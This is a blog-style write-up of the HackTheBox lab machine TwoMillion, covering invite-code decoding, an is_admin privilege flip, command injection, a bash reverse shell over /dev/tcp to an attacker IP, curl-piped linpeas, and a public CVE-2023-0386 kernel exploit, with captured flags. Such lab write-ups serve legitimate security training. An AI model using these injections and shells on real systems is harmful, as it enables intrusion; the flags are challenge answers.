<!DOCTYPE html>
<html lang="en-us">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>
TwoMillion | ARTIFACTS
</title>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">

<meta name="generator" content="Hugo 0.152.2">


<link rel="canonical" href="http://localhost:1313/captures/twomillion/" >




<link href="/css/style.min.5f46e10d3d75c0ba6553d0749280b20ce50648a191585d2b90bfa5a77f1653cd.css" rel="stylesheet">




</head>

<body>

    <div class="flexWrapper">
        <header class="headerWrapper">
    <div class="header">
        <div>
            <a class="terminal" href="/">
                <span>C-1485@artifacts.io ~ $</span>
            </a>
        </div>
        <input class="side-menu" type="checkbox" id="side-menu">
        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
        <nav class="headerLinks">
            <ul>
                
                <li>
                    <a href="http://localhost:1313/projects" title="" >
                        ~/projects</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/captures" title="" >
                        ~/captures</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/playbooks" title="" >
                        ~/playbooks</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/about" title="" >
                        ~/about</a>
                </li>
                
            </ul>
        </nav>
    </div>
</header>


        <div class="content">
            <main class="main">
                
<div class="postWrapper">
    <h1>TwoMillion</h1>
    

    
    
    
    

    
    
    
    
    

    
    
    
    
    

    
    
    
    

    
    
    
    

    
    
    
    

    
    
    
    

    
    <section class="postMetadata">
        <dl>
            
                <dt>tags</dt>
<dd><span></span>HackTheBox Machines</dd>
            
            
            
            
            
            
                <dt>reading time</dt>
                <dd>6 minutes</dd>
            
        </dl>
    </section>
    
    <div>
        <h4 id="write-up-for-the-hackthebox-machine---twomillion-in-guided-mode">Write-Up for the HackTheBox Machine - TwoMillion in Guided Mode</h4>
<hr>
<h4 id="001-scan">001: Scan</h4>
<p>The victim machine was scanned for potential open ports and services using <code>nmap</code>.
Available ports and services, according to the tool was <code>port 22(ssh)</code> and <code>port 80(http)</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sT 10.10.11.221
</span></span></code></pre></div><ul>
<li><code>-sT</code> | switch specifies scan for tcp ports</li>
</ul>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-001.png" alt="shot-001">
</p>
<hr>
<h4 id="002-hostname-mapping">002: Hostname Mapping</h4>
<p>To be able to view the website in browser, the target IP must be resolved by creating a hostname mapping in /etc/hosts.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-002.png" alt="shot-002">
</p>
<hr>
<h4 id="003-website-analysis">003: Website Analysis</h4>
<p>Burpsuite was utilized to examine available paths exposed from the victim.
As the proxy of the web tool was running, the website had shown various paths under Burpsuite&rsquo;s <code>target</code> tab.</p>
<p><code>http://2million.htb/invite</code> was observed that an invite code is required for <strong>Sign Up</strong>.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-003.png" alt="shot-003">
</p>
<hr>
<h4 id="004-obfuscated-script">004: Obfuscated Script</h4>
<p>After further examination of the website&rsquo;s source, under js/invite.min.js an eval based javascript packer obfuscation script is found in the response window of burpsuite.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-004.png" alt="shot-004">
</p>
<hr>
<h4 id="005-deobfuscation">005: Deobfuscation</h4>
<p>Utilizing 
<a href="https://tunganhken.github.io/de4js/" target="_blank" rel="noopener">https://tunganhken.github.io/de4js/</a>
 the obfuscated JavaScript was deobfuscated and beautified, revealing functions that directly invoke backend API endpoints.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-005.png" alt="shot-005">
</p>
<hr>
<h4 id="006-endpoint-request">006: Endpoint Request</h4>
<p>POST requests were sent to each endpoint, using <code>curl</code>, and was found that <code>/api/v1/invite/how/to/generate</code> outputed a json response with a ROT13 ciphered value for the key <code>data</code>.</p>
<p>Command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST http://2million.htb/api/v1/invite/how/to/generate
</span></span></code></pre></div><p align="center">
  <img src="/captures/screens/TwoMillion/shot-006.png" alt="shot-006">
</p>
<hr>
<h4 id="007-rot13-decipher">007: ROT13 Decipher</h4>
<p>
<a href="https://cryptii.com/pipes/rot13-decoder" target="_blank" rel="noopener">https://cryptii.com/pipes/rot13-decoder</a>
 is a web tool that helped with the decipher of the found ROT13.
The tool returned the following output:</p>
<ul>
<li><code>In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate</code></li>
</ul>
<p>Thus, a POST request was made to the newly found endpoint, which returned a Base64 endoded value for the key <code>code</code>.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-007.png" alt="shot-007">
</p>
<hr>
<h4 id="008-base64-decode">008: Base64 Decode</h4>
<p>
<a href="https://www.base64decode.org/" target="_blank" rel="noopener">https://www.base64decode.org/</a>
 was used to decode the Base64 encoded string in the from the POST response.
The tool returned the following output:</p>
<ul>
<li><code>X43BI-41KBY-4HMSL-SYVEG</code></li>
</ul>
<h5 id="note-each-base64-encoded-code-is-randomly-generated-meaning-that-when-decoded-the-output-will-be-different"><em>Note: Each Base64 encoded code is randomly generated, meaning that when decoded the output will be different.</em></h5>
<p>Once the decoded string is filled in the empty box of <code>/invite</code>, a redirection was made to <code>/register</code> for registration.
Next, the appropriate details were entered in <code>/login</code> and access to our personal <code>/home</code> page was granted.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-008.png" alt="shot-008">
</p>
<hr>
<h4 id="009-admin-endpoints">009: Admin Endpoints</h4>
<p>After, further examination of the website, it is found that only within <code>/home/access</code> two endpoints share the same prefix <code>/api/v1</code>.
It is observed by hovering over <strong>Connection Pack</strong> and <strong>Regenerate</strong> buttons.</p>
<p>Hence, a browse to <code>http://2million.htb/api/v1</code> various other endpoints were showed.</p>
<h5 id="note-to-be-able-to-view-apiv1-responses-the-current-created-user-must-be-logged-in-since-the-namespace-requires-authentication-via-phpsessid"><em>Note: To be able to view /api/v1 responses, the current created user must be logged in. Since the namespace requires authentication via PHPSESSID.</em></h5>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-009.png" alt="shot-009">
</p>
<p>Three endpoints were exposed related to admin, with each respective HTTP method:</p>
<ul>
<li><code>/api/v1/admin/auth</code></li>
<li><code>/api/v1/admin/vpn/generate</code></li>
<li><code>/api/v1/admin/settings/update</code></li>
</ul>
<hr>
<h4 id="010-admin-endpoint-examination">010: Admin Endpoint Examination</h4>
<p>Again with the use of Burpsuite requests were made to each admin related endpoint with the appropriate HTTP method as identified in <code>/api/v1</code> namespace.
A GET request to <code>/api/v1/admin/auth returned</code> a json response message, indicating that the current logged in user was not an admin.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-010.png" alt="shot-010">
</p>
<p>Since, the current user did not have administrative access, a POST request to <code>/api/v1/admin/vpn/generate</code>, returned a response indicating the user is unauthorized.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-011.png" alt="shot-011">
</p>
<p>Next, a PUT request to <code>/api/v1/admin/settings/update</code>, showed a response that could be tampered.
It seemed the <code>Content-Type</code> the API accepted for a PUT request was <code>application/json</code>.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-012.png" alt="shot-012">
</p>
<p>On <code>line 11</code> of the request, the <code>Content-Type</code> was specified, and some dummy <code>key:value</code> pair was added to test the victim&rsquo;s behavior.
A returned message response hinted that an email parameter was missing.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-013.png" alt="shot-013">
</p>
<p>When a valid email (created user) was added to the json structure, a new message appeared, specifying that <code>is_admin</code> also must be added to the structure.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-014.png" alt="shot-014">
</p>
<p>As properly assumed, <code>is_admin</code> was a boolean variable.
Hence by passing <code>1</code> in <code>is_admin</code>, the endpoint response showed that the variable is set to <code>1(true)</code>.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-015.png" alt="shot-015">
</p>
<p>When a new GET request was made to <code>/api/v1/admin/auth</code>, the response indicated that the created user now has administrative privileges.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-016.png" alt="shot-016">
</p>
<hr>
<h4 id="011-endpoint-command-injection">011: Endpoint Command Injection</h4>
<p>The response from a reqest to <code>/api/v1/admin/vpn/generate</code>, contained an OpenVPN client profile generated by an administrative API endpoint.
Which included CA-signed client certificates and private key, potentially enabling direct VPN access to the internal network with elevated privileges.
Hence, the OpenVNP client generation, appeared like a system level operation.
Which resulted in a command injection probe, that exposed local directories from the victim.</p>
<p>Command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;; ls #&#34;</span>
</span></span></code></pre></div><ul>
<li><code>;</code> | command separator</li>
<li><code>#</code> | ignore the rest of the line (comment)</li>
</ul>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-017.png" alt="shot-017">
</p>
<p>Environment variable values are <code>key:value</code> strings stored by the operating system and made available to running processes.
Effectively, influencing application behaviors without changing code.</p>
<p>When probed the <code>.env</code> file on the victim, various <code>key:value</code> pairs showed environment variables linked to the database of the application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;; cat .env #&#34;</span>
</span></span></code></pre></div><ul>
<li><code>;</code> | command separator</li>
<li><code>#</code> | ignore the rest of the line (comment)</li>
</ul>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-018.png" alt="shot-018">
</p>
<hr>
<h4 id="012-reverse-shell">012: Reverse Shell</h4>
<p>Nevertheless, since bash is available on the target, a bash reverse shell payload was injected to the json structure.
Effectively allowing reverse communication to the attacker machine, with system access.
Initially, a Netcat listener was setup on the attacker.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><ul>
<li><code>-lvnp</code> | set Netcat into listening mode on specified port, with no DNS resolution and verbose output</li>
</ul>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-019.png" alt="shot-019">
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.190/4444 0&gt;&amp;1&#39;</span> <span style="color:#75715e">#</span>
</span></span></code></pre></div><ul>
<li>bash reverse shell command used in burpsuite json request.</li>
</ul>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-020.png" alt="shot-020">
</p>
<p>Successfully established a reverse shell connection on the attacker machine.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-021.png" alt="shot-021">
</p>
<hr>
<h4 id="013-user-flag">013: User Flag</h4>
<p>At this point the there is access to the system with a common web server user <code>www-data</code>.
As admin credentials were found in <code>.env</code>, an attemped was made to switch from the current system user to <code>admin</code> with <code>su admin</code>.
After entering the password <code>SuperDuperPass123</code>, as assumed the user bacame <code>admin</code>.
Thus, the user flag can be captured with <code>cat user.txt</code> located in <code>/home/admin</code>.</p>
<ul>
<li><code>e6028d512a774b66d8248d6f3e6cfe82</code></li>
</ul>
<hr>
<h4 id="014-victim-enumeration">014: Victim Enumeration</h4>
<p>With <code>admin</code> privileges the victim machine was further probed for potential vulnerabilities and misconfigurations with the use of Linpeas.
Initially, a python server was ran on the attacker, at a location where <code>linpeas.sh</code> is normally located <code>/usr/share/peass/linpeas</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span>
</span></span></code></pre></div><p>Therefore, from the victim&rsquo;s shell a GET request using <code>curl</code> was made to the locally running python server for <code>linpeas.sh</code> and then piped for execution.
Which eventually after some time, the tool provided a comprehensive system enumeration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl &lt;attacker_ip&gt;/linpeas.sh | sh
</span></span></code></pre></div><hr>
<h4 id="015-privilege-escalation">015: Privilege Escalation</h4>
<p>As observed there were various findings, but what seemed of interest was an email exchange located in <code>/var/mail</code>. Indicating that the system was potentially vulnerable to <code>CVE-2023-0386</code>.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-022.png" alt="shot-022">
</p>
<p>
<a href="https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c" target="_blank" rel="noopener">https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c</a>
 provides a concise exploitation procedure for <code>CVE-2023-0386</code>.</p>
<p>The compilation process required <code>libfuse</code> for the implemention of the malicious filesystem on the victim.</p>
<ul>
<li><code>apt install libfuse-dev</code> | required library</li>
<li><code>gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl</code> | compliation to statically linked executable, allowing large file support, linking against FUSE and dynamic <code>libfuse</code> loading</li>
</ul>
<p>Then a local python server was locally ran on port 9000, for the download of the exploit on the victim machine with the use of <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -O http://&lt;attacker_ip&gt;:9000/poc
</span></span></code></pre></div><h5 id="note-command-used-on-the-victim"><em>Note: Command used on the victim&rsquo;s shell</em></h5>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-023.png" alt="shot-023">
</p>
<p>All that was required at this stage of the privilege escalation, was to make the script executable with <code>chmod +x</code> and then run it.</p>
<p align="center">
  <img src="/captures/screens/TwoMillion/shot-024.png" alt="shot-024">
</p>
<p>Thus, the system was fully compromised by becoming root.
Finally, the root flag captured with <code>cat /root/root.txt</code></p>
<ul>
<li><code>b38a9c59680e596efe9f32a089d14b6f</code></li>
</ul>
    </div>
</div>

            </main>
        </div>


        <footer class="footer">
    
        <span>
            ♣ ♦ ♠ ♥ 
        </span>
    
</footer>
    </div>

</body>

</html>
